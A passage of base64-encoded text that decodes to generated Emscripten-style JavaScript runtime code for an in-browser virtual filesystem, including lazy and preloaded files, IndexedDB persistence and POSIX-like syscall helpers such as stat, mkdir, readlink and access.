AgICAgICAgICAgICAgIHJldHVybiB0aGlzLl9sZW5ndGg7DQogICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0sDQogICAgICAgICAgICBjaHVua1NpemU6IHsNCiAgICAgICAgICAgICAgZ2V0OiAvKiogQHRoaXN7T2JqZWN0fSAqLyBmdW5jdGlvbigpIHsNCiAgICAgICAgICAgICAgICBpZighdGhpcy5sZW5ndGhLbm93bikgew0KICAgICAgICAgICAgICAgICAgdGhpcy5jYWNoZUxlbmd0aCgpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5fY2h1bmtTaXplOw0KICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgfSk7DQogIA0KICAgICAgICAgIHZhciBwcm9wZXJ0aWVzID0geyBpc0RldmljZTogZmFsc2UsIGNvbnRlbnRzOiBsYXp5QXJyYXkgfTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICB2YXIgcHJvcGVydGllcyA9IHsgaXNEZXZpY2U6IGZhbHNlLCB1cmw6IHVybCB9Ow0KICAgICAgICB9DQogIA0KICAgICAgICB2YXIgbm9kZSA9IEZTLmNyZWF0ZUZpbGUocGFyZW50LCBuYW1lLCBwcm9wZXJ0aWVzLCBjYW5SZWFkLCBjYW5Xcml0ZSk7DQogICAgICAgIC8vIFRoaXMgaXMgYSB0b3RhbCBoYWNrLCBidXQgSSB3YW50IHRvIGdldCB0aGlzIGxhenkgZmlsZSBjb2RlIG91dCBvZiB0aGUNCiAgICAgICAgLy8gY29yZSBvZiBNRU1GUy4gSWYgd2Ugd2FudCB0byBrZWVwIHRoaXMgbGF6eSBmaWxlIGNvbmNlcHQgSSBmZWVsIGl0IHNob3VsZA0KICAgICAgICAvLyBiZSBpdHMgb3duIHRoaW4gTEFaWUZTIHByb3h5aW5nIGNhbGxzIHRvIE1FTUZTLg0KICAgICAgICBpZiAocHJvcGVydGllcy5jb250ZW50cykgew0KICAgICAgICAgIG5vZGUuY29udGVudHMgPSBwcm9wZXJ0aWVzLmNvbnRlbnRzOw0KICAgICAgICB9IGVsc2UgaWYgKHByb3BlcnRpZXMudXJsKSB7DQogICAgICAgICAgbm9kZS5jb250ZW50cyA9IG51bGw7DQogICAgICAgICAgbm9kZS51cmwgPSBwcm9wZXJ0aWVzLnVybDsNCiAgICAgICAgfQ0KICAgICAgICAvLyBBZGQgYSBmdW5jdGlvbiB0aGF0IGRlZmVycyBxdWVyeWluZyB0aGUgZmlsZSBzaXplIHVudGlsIGl0IGlzIGFza2VkIHRoZSBmaXJzdCB0aW1lLg0KICAgICAgICBPYmplY3QuZGVmaW5lUHJvcGVydGllcyhub2RlLCB7DQogICAgICAgICAgdXNlZEJ5dGVzOiB7DQogICAgICAgICAgICBnZXQ6IC8qKiBAdGhpcyB7RlNOb2RlfSAqLyBmdW5jdGlvbigpIHsgcmV0dXJuIHRoaXMuY29udGVudHMubGVuZ3RoOyB9DQogICAgICAgICAgfQ0KICAgICAgICB9KTsNCiAgICAgICAgLy8gb3ZlcnJpZGUgZWFjaCBzdHJlYW0gb3Agd2l0aCBvbmUgdGhhdCB0cmllcyB0byBmb3JjZSBsb2FkIHRoZSBsYXp5IGZpbGUgZmlyc3QNCiAgICAgICAgdmFyIHN0cmVhbV9vcHMgPSB7fTsNCiAgICAgICAgdmFyIGtleXMgPSBPYmplY3Qua2V5cyhub2RlLnN0cmVhbV9vcHMpOw0KICAgICAgICBrZXlzLmZvckVhY2goZnVuY3Rpb24oa2V5KSB7DQogICAgICAgICAgdmFyIGZuID0gbm9kZS5zdHJlYW1fb3BzW2tleV07DQogICAgICAgICAgc3RyZWFtX29wc1trZXldID0gZnVuY3Rpb24gZm9yY2VMb2FkTGF6eUZpbGUoKSB7DQogICAgICAgICAgICBpZiAoIUZTLmZvcmNlTG9hZEZpbGUobm9kZSkpIHsNCiAgICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoMjkpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGZuLmFwcGx5KG51bGwsIGFyZ3VtZW50cyk7DQogICAgICAgICAgfTsNCiAgICAgICAgfSk7DQogICAgICAgIC8vIHVzZSBhIGN1c3RvbSByZWFkIGZ1bmN0aW9uDQogICAgICAgIHN0cmVhbV9vcHMucmVhZCA9IGZ1bmN0aW9uIHN0cmVhbV9vcHNfcmVhZChzdHJlYW0sIGJ1ZmZlciwgb2Zmc2V0LCBsZW5ndGgsIHBvc2l0aW9uKSB7DQogICAgICAgICAgaWYgKCFGUy5mb3JjZUxvYWRGaWxlKG5vZGUpKSB7DQogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcigyOSk7DQogICAgICAgICAgfQ0KICAgICAgICAgIHZhciBjb250ZW50cyA9IHN0cmVhbS5ub2RlLmNvbnRlbnRzOw0KICAgICAgICAgIGlmIChwb3NpdGlvbiA+PSBjb250ZW50cy5sZW5ndGgpDQogICAgICAgICAgICByZXR1cm4gMDsNCiAgICAgICAgICB2YXIgc2l6ZSA9IE1hdGgubWluKGNvbnRlbnRzLmxlbmd0aCAtIHBvc2l0aW9uLCBsZW5ndGgpOw0KICAgICAgICAgIGFzc2VydChzaXplID49IDApOw0KICAgICAgICAgIGlmIChjb250ZW50cy5zbGljZSkgeyAvLyBub3JtYWwgYXJyYXkNCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgc2l6ZTsgaSsrKSB7DQogICAgICAgICAgICAgIGJ1ZmZlcltvZmZzZXQgKyBpXSA9IGNvbnRlbnRzW3Bvc2l0aW9uICsgaV07DQogICAgICAgICAgICB9DQogICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgc2l6ZTsgaSsrKSB7IC8vIExhenlVaW50OEFycmF5IGZyb20gc3luYyBiaW5hcnkgWEhSDQogICAgICAgICAgICAgIGJ1ZmZlcltvZmZzZXQgKyBpXSA9IGNvbnRlbnRzLmdldChwb3NpdGlvbiArIGkpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgIH0NCiAgICAgICAgICByZXR1cm4gc2l6ZTsNCiAgICAgICAgfTsNCiAgICAgICAgbm9kZS5zdHJlYW1fb3BzID0gc3RyZWFtX29wczsNCiAgICAgICAgcmV0dXJuIG5vZGU7DQogICAgICB9LGNyZWF0ZVByZWxvYWRlZEZpbGU6ZnVuY3Rpb24ocGFyZW50LCBuYW1lLCB1cmwsIGNhblJlYWQsIGNhbldyaXRlLCBvbmxvYWQsIG9uZXJyb3IsIGRvbnRDcmVhdGVGaWxlLCBjYW5Pd24sIHByZUZpbmlzaCkgew0KICAgICAgICBCcm93c2VyLmluaXQoKTsgLy8gWFhYIHBlcmhhcHMgdGhpcyBtZXRob2Qgc2hvdWxkIG1vdmUgb250byBCcm93c2VyPw0KICAgICAgICAvLyBUT0RPIHdlIHNob3VsZCBhbGxvdyBwZW9wbGUgdG8ganVzdCBwYXNzIGluIGEgY29tcGxldGUgZmlsZW5hbWUgaW5zdGVhZA0KICAgICAgICAvLyBvZiBwYXJlbnQgYW5kIG5hbWUgYmVpbmcgdGhhdCB3ZSBqdXN0IGpvaW4gdGhlbSBhbnl3YXlzDQogICAgICAgIHZhciBmdWxsbmFtZSA9IG5hbWUgPyBQQVRIX0ZTLnJlc29sdmUoUEFUSC5qb2luMihwYXJlbnQsIG5hbWUpKSA6IHBhcmVudDsNCiAgICAgICAgdmFyIGRlcCA9IGdldFVuaXF1ZVJ1bkRlcGVuZGVuY3koJ2NwICcgKyBmdWxsbmFtZSk7IC8vIG1pZ2h0IGhhdmUgc2V2ZXJhbCBhY3RpdmUgcmVxdWVzdHMgZm9yIHRoZSBzYW1lIGZ1bGxuYW1lDQogICAgICAgIGZ1bmN0aW9uIHByb2Nlc3NEYXRhKGJ5dGVBcnJheSkgew0KICAgICAgICAgIGZ1bmN0aW9uIGZpbmlzaChieXRlQXJyYXkpIHsNCiAgICAgICAgICAgIGlmIChwcmVGaW5pc2gpIHByZUZpbmlzaCgpOw0KICAgICAgICAgICAgaWYgKCFkb250Q3JlYXRlRmlsZSkgew0KICAgICAgICAgICAgICBGUy5jcmVhdGVEYXRhRmlsZShwYXJlbnQsIG5hbWUsIGJ5dGVBcnJheSwgY2FuUmVhZCwgY2FuV3JpdGUsIGNhbk93bik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAob25sb2FkKSBvbmxvYWQoKTsNCiAgICAgICAgICAgIHJlbW92ZVJ1bkRlcGVuZGVuY3koZGVwKTsNCiAgICAgICAgICB9DQogICAgICAgICAgdmFyIGhhbmRsZWQgPSBmYWxzZTsNCiAgICAgICAgICBNb2R1bGVbJ3ByZWxvYWRQbHVnaW5zJ10uZm9yRWFjaChmdW5jdGlvbihwbHVnaW4pIHsNCiAgICAgICAgICAgIGlmIChoYW5kbGVkKSByZXR1cm47DQogICAgICAgICAgICBpZiAocGx1Z2luWydjYW5IYW5kbGUnXShmdWxsbmFtZSkpIHsNCiAgICAgICAgICAgICAgcGx1Z2luWydoYW5kbGUnXShieXRlQXJyYXksIGZ1bGxuYW1lLCBmaW5pc2gsIGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgIGlmIChvbmVycm9yKSBvbmVycm9yKCk7DQogICAgICAgICAgICAgICAgcmVtb3ZlUnVuRGVwZW5kZW5jeShkZXApOw0KICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgaGFuZGxlZCA9IHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgfSk7DQogICAgICAgICAgaWYgKCFoYW5kbGVkKSBmaW5pc2goYnl0ZUFycmF5KTsNCiAgICAgICAgfQ0KICAgICAgICBhZGRSdW5EZXBlbmRlbmN5KGRlcCk7DQogICAgICAgIGlmICh0eXBlb2YgdXJsID09ICdzdHJpbmcnKSB7DQogICAgICAgICAgQnJvd3Nlci5hc3luY0xvYWQodXJsLCBmdW5jdGlvbihieXRlQXJyYXkpIHsNCiAgICAgICAgICAgIHByb2Nlc3NEYXRhKGJ5dGVBcnJheSk7DQogICAgICAgICAgfSwgb25lcnJvcik7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgcHJvY2Vzc0RhdGEodXJsKTsNCiAgICAgICAgfQ0KICAgICAgfSxpbmRleGVkREI6ZnVuY3Rpb24oKSB7DQogICAgICAgIHJldHVybiB3aW5kb3cuaW5kZXhlZERCIHx8IHdpbmRvdy5tb3pJbmRleGVkREIgfHwgd2luZG93LndlYmtpdEluZGV4ZWREQiB8fCB3aW5kb3cubXNJbmRleGVkREI7DQogICAgICB9LERCX05BTUU6ZnVuY3Rpb24oKSB7DQogICAgICAgIHJldHVybiAnRU1fRlNfJyArIHdpbmRvdy5sb2NhdGlvbi5wYXRobmFtZTsNCiAgICAgIH0sREJfVkVSU0lPTjoyMCxEQl9TVE9SRV9OQU1FOiJGSUxFX0RBVEEiLHNhdmVGaWxlc1RvREI6ZnVuY3Rpb24ocGF0aHMsIG9ubG9hZCwgb25lcnJvcikgew0KICAgICAgICBvbmxvYWQgPSBvbmxvYWQgfHwgZnVuY3Rpb24oKXt9Ow0KICAgICAgICBvbmVycm9yID0gb25lcnJvciB8fCBmdW5jdGlvbigpe307DQogICAgICAgIHZhciBpbmRleGVkREIgPSBGUy5pbmRleGVkREIoKTsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICB2YXIgb3BlblJlcXVlc3QgPSBpbmRleGVkREIub3BlbihGUy5EQl9OQU1FKCksIEZTLkRCX1ZFUlNJT04pOw0KICAgICAgICB9IGNhdGNoIChlKSB7DQogICAgICAgICAgcmV0dXJuIG9uZXJyb3IoZSk7DQogICAgICAgIH0NCiAgICAgICAgb3BlblJlcXVlc3Qub251cGdyYWRlbmVlZGVkID0gZnVuY3Rpb24gb3BlblJlcXVlc3Rfb251cGdyYWRlbmVlZGVkKCkgew0KICAgICAgICAgIG91dCgnY3JlYXRpbmcgZGInKTsNCiAgICAgICAgICB2YXIgZGIgPSBvcGVuUmVxdWVzdC5yZXN1bHQ7DQogICAgICAgICAgZGIuY3JlYXRlT2JqZWN0U3RvcmUoRlMuREJfU1RPUkVfTkFNRSk7DQogICAgICAgIH07DQogICAgICAgIG9wZW5SZXF1ZXN0Lm9uc3VjY2VzcyA9IGZ1bmN0aW9uIG9wZW5SZXF1ZXN0X29uc3VjY2VzcygpIHsNCiAgICAgICAgICB2YXIgZGIgPSBvcGVuUmVxdWVzdC5yZXN1bHQ7DQogICAgICAgICAgdmFyIHRyYW5zYWN0aW9uID0gZGIudHJhbnNhY3Rpb24oW0ZTLkRCX1NUT1JFX05BTUVdLCAncmVhZHdyaXRlJyk7DQogICAgICAgICAgdmFyIGZpbGVzID0gdHJhbnNhY3Rpb24ub2JqZWN0U3RvcmUoRlMuREJfU1RPUkVfTkFNRSk7DQogICAgICAgICAgdmFyIG9rID0gMCwgZmFpbCA9IDAsIHRvdGFsID0gcGF0aHMubGVuZ3RoOw0KICAgICAgICAgIGZ1bmN0aW9uIGZpbmlzaCgpIHsNCiAgICAgICAgICAgIGlmIChmYWlsID09IDApIG9ubG9hZCgpOyBlbHNlIG9uZXJyb3IoKTsNCiAgICAgICAgICB9DQogICAgICAgICAgcGF0aHMuZm9yRWFjaChmdW5jdGlvbihwYXRoKSB7DQogICAgICAgICAgICB2YXIgcHV0UmVxdWVzdCA9IGZpbGVzLnB1dChGUy5hbmFseXplUGF0aChwYXRoKS5vYmplY3QuY29udGVudHMsIHBhdGgpOw0KICAgICAgICAgICAgcHV0UmVxdWVzdC5vbnN1Y2Nlc3MgPSBmdW5jdGlvbiBwdXRSZXF1ZXN0X29uc3VjY2VzcygpIHsgb2srKzsgaWYgKG9rICsgZmFpbCA9PSB0b3RhbCkgZmluaXNoKCkgfTsNCiAgICAgICAgICAgIHB1dFJlcXVlc3Qub25lcnJvciA9IGZ1bmN0aW9uIHB1dFJlcXVlc3Rfb25lcnJvcigpIHsgZmFpbCsrOyBpZiAob2sgKyBmYWlsID09IHRvdGFsKSBmaW5pc2goKSB9Ow0KICAgICAgICAgIH0pOw0KICAgICAgICAgIHRyYW5zYWN0aW9uLm9uZXJyb3IgPSBvbmVycm9yOw0KICAgICAgICB9Ow0KICAgICAgICBvcGVuUmVxdWVzdC5vbmVycm9yID0gb25lcnJvcjsNCiAgICAgIH0sbG9hZEZpbGVzRnJvbURCOmZ1bmN0aW9uKHBhdGhzLCBvbmxvYWQsIG9uZXJyb3IpIHsNCiAgICAgICAgb25sb2FkID0gb25sb2FkIHx8IGZ1bmN0aW9uKCl7fTsNCiAgICAgICAgb25lcnJvciA9IG9uZXJyb3IgfHwgZnVuY3Rpb24oKXt9Ow0KICAgICAgICB2YXIgaW5kZXhlZERCID0gRlMuaW5kZXhlZERCKCk7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgdmFyIG9wZW5SZXF1ZXN0ID0gaW5kZXhlZERCLm9wZW4oRlMuREJfTkFNRSgpLCBGUy5EQl9WRVJTSU9OKTsNCiAgICAgICAgfSBjYXRjaCAoZSkgew0KICAgICAgICAgIHJldHVybiBvbmVycm9yKGUpOw0KICAgICAgICB9DQogICAgICAgIG9wZW5SZXF1ZXN0Lm9udXBncmFkZW5lZWRlZCA9IG9uZXJyb3I7IC8vIG5vIGRhdGFiYXNlIHRvIGxvYWQgZnJvbQ0KICAgICAgICBvcGVuUmVxdWVzdC5vbnN1Y2Nlc3MgPSBmdW5jdGlvbiBvcGVuUmVxdWVzdF9vbnN1Y2Nlc3MoKSB7DQogICAgICAgICAgdmFyIGRiID0gb3BlblJlcXVlc3QucmVzdWx0Ow0KICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICB2YXIgdHJhbnNhY3Rpb24gPSBkYi50cmFuc2FjdGlvbihbRlMuREJfU1RPUkVfTkFNRV0sICdyZWFkb25seScpOw0KICAgICAgICAgIH0gY2F0Y2goZSkgew0KICAgICAgICAgICAgb25lcnJvcihlKTsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICB9DQogICAgICAgICAgdmFyIGZpbGVzID0gdHJhbnNhY3Rpb24ub2JqZWN0U3RvcmUoRlMuREJfU1RPUkVfTkFNRSk7DQogICAgICAgICAgdmFyIG9rID0gMCwgZmFpbCA9IDAsIHRvdGFsID0gcGF0aHMubGVuZ3RoOw0KICAgICAgICAgIGZ1bmN0aW9uIGZpbmlzaCgpIHsNCiAgICAgICAgICAgIGlmIChmYWlsID09IDApIG9ubG9hZCgpOyBlbHNlIG9uZXJyb3IoKTsNCiAgICAgICAgICB9DQogICAgICAgICAgcGF0aHMuZm9yRWFjaChmdW5jdGlvbihwYXRoKSB7DQogICAgICAgICAgICB2YXIgZ2V0UmVxdWVzdCA9IGZpbGVzLmdldChwYXRoKTsNCiAgICAgICAgICAgIGdldFJlcXVlc3Qub25zdWNjZXNzID0gZnVuY3Rpb24gZ2V0UmVxdWVzdF9vbnN1Y2Nlc3MoKSB7DQogICAgICAgICAgICAgIGlmIChGUy5hbmFseXplUGF0aChwYXRoKS5leGlzdHMpIHsNCiAgICAgICAgICAgICAgICBGUy51bmxpbmsocGF0aCk7DQogICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgRlMuY3JlYXRlRGF0YUZpbGUoUEFUSC5kaXJuYW1lKHBhdGgpLCBQQVRILmJhc2VuYW1lKHBhdGgpLCBnZXRSZXF1ZXN0LnJlc3VsdCwgdHJ1ZSwgdHJ1ZSwgdHJ1ZSk7DQogICAgICAgICAgICAgIG9rKys7DQogICAgICAgICAgICAgIGlmIChvayArIGZhaWwgPT0gdG90YWwpIGZpbmlzaCgpOw0KICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIGdldFJlcXVlc3Qub25lcnJvciA9IGZ1bmN0aW9uIGdldFJlcXVlc3Rfb25lcnJvcigpIHsgZmFpbCsrOyBpZiAob2sgKyBmYWlsID09IHRvdGFsKSBmaW5pc2goKSB9Ow0KICAgICAgICAgIH0pOw0KICAgICAgICAgIHRyYW5zYWN0aW9uLm9uZXJyb3IgPSBvbmVycm9yOw0KICAgICAgICB9Ow0KICAgICAgICBvcGVuUmVxdWVzdC5vbmVycm9yID0gb25lcnJvcjsNCiAgICAgIH19O3ZhciBTWVNDQUxMUz17bWFwcGluZ3M6e30sREVGQVVMVF9QT0xMTUFTSzo1LHVtYXNrOjUxMSxjYWxjdWxhdGVBdDpmdW5jdGlvbihkaXJmZCwgcGF0aCkgew0KICAgICAgICBpZiAocGF0aFswXSAhPT0gJy8nKSB7DQogICAgICAgICAgLy8gcmVsYXRpdmUgcGF0aA0KICAgICAgICAgIHZhciBkaXI7DQogICAgICAgICAgaWYgKGRpcmZkID09PSAtMTAwKSB7DQogICAgICAgICAgICBkaXIgPSBGUy5jd2QoKTsNCiAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgdmFyIGRpcnN0cmVhbSA9IEZTLmdldFN0cmVhbShkaXJmZCk7DQogICAgICAgICAgICBpZiAoIWRpcnN0cmVhbSkgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoOCk7DQogICAgICAgICAgICBkaXIgPSBkaXJzdHJlYW0ucGF0aDsNCiAgICAgICAgICB9DQogICAgICAgICAgcGF0aCA9IFBBVEguam9pbjIoZGlyLCBwYXRoKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gcGF0aDsNCiAgICAgIH0sZG9TdGF0OmZ1bmN0aW9uKGZ1bmMsIHBhdGgsIGJ1Zikgew0KICAgICAgICB0cnkgew0KICAgICAgICAgIHZhciBzdGF0ID0gZnVuYyhwYXRoKTsNCiAgICAgICAgfSBjYXRjaCAoZSkgew0KICAgICAgICAgIGlmIChlICYmIGUubm9kZSAmJiBQQVRILm5vcm1hbGl6ZShwYXRoKSAhPT0gUEFUSC5ub3JtYWxpemUoRlMuZ2V0UGF0aChlLm5vZGUpKSkgew0KICAgICAgICAgICAgLy8gYW4gZXJyb3Igb2NjdXJyZWQgd2hpbGUgdHJ5aW5nIHRvIGxvb2sgdXAgdGhlIHBhdGg7IHdlIHNob3VsZCBqdXN0IHJlcG9ydCBFTk9URElSDQogICAgICAgICAgICByZXR1cm4gLTU0Ow0KICAgICAgICAgIH0NCiAgICAgICAgICB0aHJvdyBlOw0KICAgICAgICB9DQogICAgICAgIEhFQVAzMlsoKGJ1Zik+PjIpXT1zdGF0LmRldjsNCiAgICAgICAgSEVBUDMyWygoKGJ1ZikrKDQpKT4+MildPTA7DQogICAgICAgIEhFQVAzMlsoKChidWYpKyg4KSk+PjIpXT1zdGF0LmlubzsNCiAgICAgICAgSEVBUDMyWygoKGJ1ZikrKDEyKSk+PjIpXT1zdGF0Lm1vZGU7DQogICAgICAgIEhFQVAzMlsoKChidWYpKygxNikpPj4yKV09c3RhdC5ubGluazsNCiAgICAgICAgSEVBUDMyWygoKGJ1ZikrKDIwKSk+PjIpXT1zdGF0LnVpZDsNCiAgICAgICAgSEVBUDMyWygoKGJ1ZikrKDI0KSk+PjIpXT1zdGF0LmdpZDsNCiAgICAgICAgSEVBUDMyWygoKGJ1ZikrKDI4KSk+PjIpXT1zdGF0LnJkZXY7DQogICAgICAgIEhFQVAzMlsoKChidWYpKygzMikpPj4yKV09MDsNCiAgICAgICAgKHRlbXBJNjQgPSBbc3RhdC5zaXplPj4+MCwodGVtcERvdWJsZT1zdGF0LnNpemUsKCsoTWF0aF9hYnModGVtcERvdWJsZSkpKSA+PSAxLjAgPyAodGVtcERvdWJsZSA+IDAuMCA/ICgoTWF0aF9taW4oKCsoTWF0aF9mbG9vcigodGVtcERvdWJsZSkvNDI5NDk2NzI5Ni4wKSkpLCA0Mjk0OTY3Mjk1LjApKXwwKT4+PjAgOiAofn4oKCsoTWF0aF9jZWlsKCh0ZW1wRG91YmxlIC0gKygoKH5+KHRlbXBEb3VibGUpKSk+Pj4wKSkvNDI5NDk2NzI5Ni4wKSkpKSk+Pj4wKSA6IDApXSxIRUFQMzJbKCgoYnVmKSsoNDApKT4+MildPXRlbXBJNjRbMF0sSEVBUDMyWygoKGJ1ZikrKDQ0KSk+PjIpXT10ZW1wSTY0WzFdKTsNCiAgICAgICAgSEVBUDMyWygoKGJ1ZikrKDQ4KSk+PjIpXT00MDk2Ow0KICAgICAgICBIRUFQMzJbKCgoYnVmKSsoNTIpKT4+MildPXN0YXQuYmxvY2tzOw0KICAgICAgICBIRUFQMzJbKCgoYnVmKSsoNTYpKT4+MildPShzdGF0LmF0aW1lLmdldFRpbWUoKSAvIDEwMDApfDA7DQogICAgICAgIEhFQVAzMlsoKChidWYpKyg2MCkpPj4yKV09MDsNCiAgICAgICAgSEVBUDMyWygoKGJ1ZikrKDY0KSk+PjIpXT0oc3RhdC5tdGltZS5nZXRUaW1lKCkgLyAxMDAwKXwwOw0KICAgICAgICBIRUFQMzJbKCgoYnVmKSsoNjgpKT4+MildPTA7DQogICAgICAgIEhFQVAzMlsoKChidWYpKyg3MikpPj4yKV09KHN0YXQuY3RpbWUuZ2V0VGltZSgpIC8gMTAwMCl8MDsNCiAgICAgICAgSEVBUDMyWygoKGJ1ZikrKDc2KSk+PjIpXT0wOw0KICAgICAgICAodGVtcEk2NCA9IFtzdGF0Lmlubz4+PjAsKHRlbXBEb3VibGU9c3RhdC5pbm8sKCsoTWF0aF9hYnModGVtcERvdWJsZSkpKSA+PSAxLjAgPyAodGVtcERvdWJsZSA+IDAuMCA/ICgoTWF0aF9taW4oKCsoTWF0aF9mbG9vcigodGVtcERvdWJsZSkvNDI5NDk2NzI5Ni4wKSkpLCA0Mjk0OTY3Mjk1LjApKXwwKT4+PjAgOiAofn4oKCsoTWF0aF9jZWlsKCh0ZW1wRG91YmxlIC0gKygoKH5+KHRlbXBEb3VibGUpKSk+Pj4wKSkvNDI5NDk2NzI5Ni4wKSkpKSk+Pj4wKSA6IDApXSxIRUFQMzJbKCgoYnVmKSsoODApKT4+MildPXRlbXBJNjRbMF0sSEVBUDMyWygoKGJ1ZikrKDg0KSk+PjIpXT10ZW1wSTY0WzFdKTsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9LGRvTXN5bmM6ZnVuY3Rpb24oYWRkciwgc3RyZWFtLCBsZW4sIGZsYWdzLCBvZmZzZXQpIHsNCiAgICAgICAgdmFyIGJ1ZmZlciA9IEhFQVBVOC5zbGljZShhZGRyLCBhZGRyICsgbGVuKTsNCiAgICAgICAgRlMubXN5bmMoc3RyZWFtLCBidWZmZXIsIG9mZnNldCwgbGVuLCBmbGFncyk7DQogICAgICB9LGRvTWtkaXI6ZnVuY3Rpb24ocGF0aCwgbW9kZSkgew0KICAgICAgICAvLyByZW1vdmUgYSB0cmFpbGluZyBzbGFzaCwgaWYgb25lIC0gL2EvYi8gaGFzIGJhc2VuYW1lIG9mICcnLCBidXQNCiAgICAgICAgLy8gd2Ugd2FudCB0byBjcmVhdGUgYiBpbiB0aGUgY29udGV4dCBvZiB0aGlzIGZ1bmN0aW9uDQogICAgICAgIHBhdGggPSBQQVRILm5vcm1hbGl6ZShwYXRoKTsNCiAgICAgICAgaWYgKHBhdGhbcGF0aC5sZW5ndGgtMV0gPT09ICcvJykgcGF0aCA9IHBhdGguc3Vic3RyKDAsIHBhdGgubGVuZ3RoLTEpOw0KICAgICAgICBGUy5ta2RpcihwYXRoLCBtb2RlLCAwKTsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9LGRvTWtub2Q6ZnVuY3Rpb24ocGF0aCwgbW9kZSwgZGV2KSB7DQogICAgICAgIC8vIHdlIGRvbid0IHdhbnQgdGhpcyBpbiB0aGUgSlMgQVBJIGFzIGl0IHVzZXMgbWtub2QgdG8gY3JlYXRlIGFsbCBub2Rlcy4NCiAgICAgICAgc3dpdGNoIChtb2RlICYgNjE0NDApIHsNCiAgICAgICAgICBjYXNlIDMyNzY4Og0KICAgICAgICAgIGNhc2UgODE5MjoNCiAgICAgICAgICBjYXNlIDI0NTc2Og0KICAgICAgICAgIGNhc2UgNDA5NjoNCiAgICAgICAgICBjYXNlIDQ5MTUyOg0KICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgZGVmYXVsdDogcmV0dXJuIC0yODsNCiAgICAgICAgfQ0KICAgICAgICBGUy5ta25vZChwYXRoLCBtb2RlLCBkZXYpOw0KICAgICAgICByZXR1cm4gMDsNCiAgICAgIH0sZG9SZWFkbGluazpmdW5jdGlvbihwYXRoLCBidWYsIGJ1ZnNpemUpIHsNCiAgICAgICAgaWYgKGJ1ZnNpemUgPD0gMCkgcmV0dXJuIC0yODsNCiAgICAgICAgdmFyIHJldCA9IEZTLnJlYWRsaW5rKHBhdGgpOw0KICANCiAgICAgICAgdmFyIGxlbiA9IE1hdGgubWluKGJ1ZnNpemUsIGxlbmd0aEJ5dGVzVVRGOChyZXQpKTsNCiAgICAgICAgdmFyIGVuZENoYXIgPSBIRUFQOFtidWYrbGVuXTsNCiAgICAgICAgc3RyaW5nVG9VVEY4KHJldCwgYnVmLCBidWZzaXplKzEpOw0KICAgICAgICAvLyByZWFkbGluayBpcyBvbmUgb2YgdGhlIHJhcmUgZnVuY3Rpb25zIHRoYXQgd3JpdGUgb3V0IGEgQyBzdHJpbmcsIGJ1dCBkb2VzIG5ldmVyIGFwcGVuZCBhIG51bGwgdG8gdGhlIG91dHB1dCBidWZmZXIoISkNCiAgICAgICAgLy8gc3RyaW5nVG9VVEY4KCkgYWx3YXlzIGFwcGVuZHMgYSBudWxsIGJ5dGUsIHNvIHJlc3RvcmUgdGhlIGNoYXJhY3RlciB1bmRlciB0aGUgbnVsbCBieXRlIGFmdGVyIHRoZSB3cml0ZS4NCiAgICAgICAgSEVBUDhbYnVmK2xlbl0gPSBlbmRDaGFyOw0KICANCiAgICAgICAgcmV0dXJuIGxlbjsNCiAgICAgIH0sZG9BY2Nlc3M6ZnVuY3Rpb24ocGF0aCwgYW1vZGUpIHsNCiAgICAgICAgaWYgKGFtb2RlICYgfjcpIHsNCiAgICAgICAgICAvLyBuZWVkIGEgdmFsaWQgbW9kZQ0KICAgICAgICAgIHJldHVybiAtMjg7DQogICAgICAgIH0NCiAgICAgICAgdmFyIG5vZGU7DQogICAgICAgIHZhciBsb29rdXAgPSBGUy5sb29rdXBQYXRoKHBhdGgsIHsgZm9sbG93OiB0cnVlIH0pOw0KICAgICAgICBub2RlID0gbG9va3VwLm5vZGU7DQogICAgICAgIGlmICghbm9kZSkgew0KICAgICAgICAgIHJldHVybiAtNDQ7DQogICAgICAgIH0NCiAgICAgICAgdmFyIHBlcm1zID0gJyc7DQogICAgICAgIGlmIChhbW9kZSAmIDQpIHBlcm1zICs9ICdyJzsNCiAgICAgICAgaWYgKGFtb2RlICYgMikgcGVybXMgKz0gJ3cnOw0KICAgICAgICBpZiAoYW1vZGUgJiAxKSBwZXJtcyArPSAneCc7DQogICAgICAgIGlmIChwZXJtcyAvKiBvdGhlcndpc2UsIHRoZXkndmUganVzdCBwYXNzZWQgRl9PSyAqLyAmJiBGUy5ub2RlUGVybWlzc2lvbnMobm9kZSwgcGVybXMpKSB7DQogICAgICAgICAgcmV0dXJuIC0yOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAwOw0KICAgICAgfSxkb0R1cDpmdW5jdGlvbihwYXRoLCBmbGFncywgc3VnZ2VzdEZEKSB7DQogICAgICAgIHZhciBzdWdnZXN0ID0gRlMuZ2V0U3RyZWFtKHN1Z2dlc3RGRCk7DQogICAgICAgIGlmIChzdWdnZXN0KSBGUy5jbG9zZShzdWdnZXN0KTsNCiAgICAgICAgcmV0dXJuIEZTLm9wZW4ocGF0aCwgZmxhZ3MsIDAsIHN